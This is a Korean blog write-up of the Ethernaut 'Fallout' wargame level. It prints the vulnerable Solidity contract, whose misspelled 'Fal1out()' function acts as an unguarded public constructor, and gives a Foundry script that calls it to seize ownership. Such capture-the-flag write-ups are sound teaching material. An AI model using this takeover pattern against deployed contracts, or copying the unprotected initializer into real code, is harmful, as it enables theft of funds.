---
title: Ethernaut > Hello Ethernaut
author: ieuns
date: 2025-11-19 00:34:00 +0900
categories: [Web3, Solidity]
tags: [Ethernaut]
---

이번글에서는 [Ethernaut](https://ethernaut.openzeppelin.com/)의 'Fallout' 문제를 풀어보겠습니다.

## `0x01` Fallout
---
이번 문제의 설명은 아래와 같습니다.

```
Claim ownership of the contract below to complete this level.

  Things that might help

Solidity Remix IDE
```

별 내용은 없고 어김없이 소유권을 가져와야합니다.

바로 코드를 살펴보도록 하겠습니다.


## `0x02` Code Audit
---
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lib/openzeppelin-contracts/contracts/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

코드를 보니 바로 문제점이 보입니다.


해당 문제의 가장 큰 문제점은  `Fal1out()` 함수가 컨트랙트 이름인 `Fallout`과 오타(‘l’ 대신 ‘1’)로 인해 생성자가 아닌 일반 public 함수로 인식된다는 점입니다.

Solidity ^0.6.0 버전에서는 컨트랙트 이름과 동일한 함수가 자동으로 생성자로 처리되지 않고, `constructor` 키워드를 사용해야 합니다. 

이로 인해 누구나 `Fal1out()`를 호출해 `owner = msg.sender`로 소유권을 탈취할 수 있습니다.



Solidity 0.4.x 이하에서는 컨트랙트 이름과 같은 함수가 생성자로 작동했으나, 0.5.0부터 `constructor` 키워드가 필수입니다. 코드의 `/* constructor */` 주석은 의도를 나타내지만, 오타와 버전 호환성 문제로 무효화됩니다. 

결과적으로 배포 후 공격자가 이 함수를 호출하면 `allocationsowner` 설정과 함께 소유권이 넘어갑니다.


그럼 시나리오를 간략하게 짜보자면

-  `Fal1out()` 호출 > owner 권한 획득

위와 같은 정도가 될 것 같습니다. 

바로 코드로 옮겨보겠습니다.


## `0x03` Solve
---
> 이번 풀이부터는 Solidity로 작성됩니다.

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";


contract Level0Solution is Script {
    Fallout public falloutInstance = Fallout(INSTANCE_ADDRESS);

    function run() external {
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("CALL:: Fal1out()");
        falloutInstance.Fal1out{value : 1 wei}();

        console.log("owner check");

        console.log("New Owner :", falloutInstance.owner());
        console.log("My Address :", vm.envAddress("MY_ADDRESS"));
        
        vm.stopBroadcast();
    }
}
```

다른 함수 호출할 것 없이 `Fal1out` 함수를 호출해주고, 현재 owenr와 나의 주소를 비교합니다.

이후 서로의 주소가 같다면 제출하면 됩니다.